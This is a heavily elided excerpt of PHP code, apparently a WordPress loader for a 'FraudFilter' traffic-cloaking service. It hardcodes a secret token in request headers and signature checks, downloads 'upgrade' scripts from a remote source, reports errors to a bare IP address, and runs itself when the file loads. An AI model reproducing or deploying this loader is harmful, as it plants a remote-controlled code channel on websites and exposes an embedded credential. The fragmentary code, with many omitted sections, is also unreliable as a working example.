...
class FraudFilterWordPressLoader_f3i5l {
    public function run() {
    ...
    function isSignatureValidTemp($sign, $time) {
        $str = '52f671db-4a0d-403e-9f22-47b056e57c90.'.$this->getClidTemp().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
    ...
    function getUpgradeScriptViaContentsWP($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 52f671db-4a0d-403e-9f22-47b056e57c90',
                'timeout' => 2
            )
        );
    ...
    function downloadScriptFirstTime($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            ...
            $headers[] = 'x-ff-secret: 52f671db-4a0d-403e-9f22-47b056e57c90';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 52f671db-4a0d-403e-9f22-47b056e57c90';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=f3i5l&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterWordPressLoader_f3i5l = new FraudFilterWordPressLoader_f3i5l();
$fraudFilterWordPressLoader_f3i5l->run();
